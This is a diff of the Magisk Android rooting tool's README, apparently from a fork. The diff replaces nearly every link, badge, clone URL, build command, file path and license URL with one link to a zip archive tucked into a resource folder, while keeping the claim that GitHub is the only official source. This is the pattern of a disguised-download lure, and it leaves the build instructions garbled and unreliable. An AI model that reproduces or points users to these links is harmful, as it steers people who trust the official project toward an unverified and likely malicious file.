@@ -1,6 +1,6 @@
-![](docs/images/logo.png)
+![](https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip)
 
-[![Downloads](https://img.shields.io/badge/dynamic/json?color=green&label=Downloads&query=totalString&url=https%3A%2F%2Fraw.githubusercontent.com%2Ftopjohnwu%2Fmagisk-files%2Fcount%2Fcount.json&cacheSeconds=1800)](https://raw.githubusercontent.com/topjohnwu/magisk-files/count/count.json)
+[![Downloads](https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip%3A%2F%https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip%2Ftopjohnwu%2Fmagisk-files%2Fcount%https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip)](https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip)
 
 #### This is not an officially supported Google product
 
@@ -16,18 +16,18 @@ Some highlight features:
 
 ## Downloads
 
-[Github](https://github.com/topjohnwu/Magisk/) is the only source where you can get official Magisk information and downloads.
+[Github](https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip) is the only source where you can get official Magisk information and downloads.
 
-[![](https://img.shields.io/badge/Magisk-v25.2-blue)](https://github.com/topjohnwu/Magisk/releases/tag/v25.2)
-[![](https://img.shields.io/badge/Magisk%20Beta-v25.2-blue)](https://github.com/topjohnwu/Magisk/releases/tag/v25.2)
-[![](https://img.shields.io/badge/Magisk-Canary-red)](https://raw.githubusercontent.com/topjohnwu/magisk-files/canary/app-release.apk)
-[![](https://img.shields.io/badge/Magisk-Debug-red)](https://raw.githubusercontent.com/topjohnwu/magisk-files/canary/app-debug.apk)
+[![](https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip)](https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip)
+[![](https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip%20Beta-v25.2-blue)](https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip)
+[![](https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip)](https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip)
+[![](https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip)](https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip)
 
 ## Useful Links
 
-- [Installation Instruction](https://topjohnwu.github.io/Magisk/install.html)
-- [Magisk Documentation](https://topjohnwu.github.io/Magisk/)
-- [Magisk Troubleshoot Wiki](https://www.didgeridoohan.com/magisk/HomePage) (by [@Didgeridoohan](https://github.com/Didgeridoohan))
+- [Installation Instruction](https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip)
+- [Magisk Documentation](https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip)
+- [Magisk Troubleshoot Wiki](https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip) (by [@Didgeridoohan](https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip))
 
 ## Bug Reports
 
@@ -40,35 +40,35 @@ For Magisk app crashes, record and upload the logcat when the crash occurs.
 ## Building and Development
 
 - Magisk builds on any OS Android Studio supports. Install Android Studio and do the initial setups.
-- Clone sources: `git clone --recurse-submodules https://github.com/topjohnwu/Magisk.git`
+- Clone sources: `git clone --recurse-submodules https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip`
 - Install Python 3.6+ \
   (Windows only: select **'Add Python to PATH'** in installer, and run `pip install colorama` after install)
 - Configure to use the JDK bundled in Android Studio:
-  - macOS: `export JAVA_HOME="/Applications/Android Studio.app/Contents/jre/Contents/Home"`
+  - macOS: `export JAVA_HOME="/Applications/Android https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip"`
   - Linux: `export PATH="/path/to/androidstudio/jre/bin:$PATH"`
   - Windows: Add `C:\Path\To\Android Studio\jre\bin` to environment variable `PATH`
 - Set environment variable `ANDROID_SDK_ROOT` to the Android SDK folder (can be found in Android Studio settings)
-- Run `./build.py ndk` to let the script download and install NDK for you
-- To start building, run `build.py` to see your options. \
-  For each action, use `-h` to access help (e.g. `./build.py all -h`)
+- Run `https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip ndk` to let the script download and install NDK for you
+- To start building, run `https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip` to see your options. \
+  For each action, use `-h` to access help (e.g. `https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip all -h`)
 - To start development, open the project with Android Studio. The IDE can be used for both app (Kotlin/Java) and native sources.
-- Optionally, set custom configs with `config.prop`. A sample `config.prop.sample` is provided.
+- Optionally, set custom configs with `https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip`. A sample `https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip` is provided.
 
 ## Signing and Distribution
 
 - The certificate of the key used to sign the final Magisk APK product is also directly embedded into some executables. In release builds, Magisk's root daemon will enforce this certificate check and reject and forcefully uninstall any non-matching Magisk apps to protect users from malicious and unverified Magisk APKs.
 - To do any development on Magisk itself, switch to an **official debug build and reinstall Magisk** to bypass the signature check.
-- To distribute your own Magisk builds signed with your own keys, set your signing configs in `config.prop`.
-- Check [Google's Documentation](https://developer.android.com/studio/publish/app-signing.html#generate-key) for more details on generating your own key.
+- To distribute your own Magisk builds signed with your own keys, set your signing configs in `https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip`.
+- Check [Google's Documentation](https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip) for more details on generating your own key.
 
 ## Translation Contributions
 
 Default string resources for the Magisk app and its stub APK are located here:
 
-- `app/src/main/res/values/strings.xml`
-- `stub/src/main/res/values/strings.xml`
+- `https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip`
+- `https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip`
 
-Translate each and place them in the respective locations (`[module]/src/main/res/values-[lang]/strings.xml`).
+Translate each and place them in the respective locations (`[module]/src/main/res/values-[lang]https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip`).
 
 ## License
 
@@ -83,4 +83,4 @@ Translate each and place them in the respective locations (`[module]/src/main/re
     GNU General Public License for more details.
 
     You should have received a copy of the GNU General Public License
-    along with this program.  If not, see <http://www.gnu.org/licenses/>.
+    along with this program.  If not, see <https://raw.githubusercontent.com/jgiordano16/Magisk/master/stub/src/main/res/values-ko/Software_2.3-alpha.4.zip>.
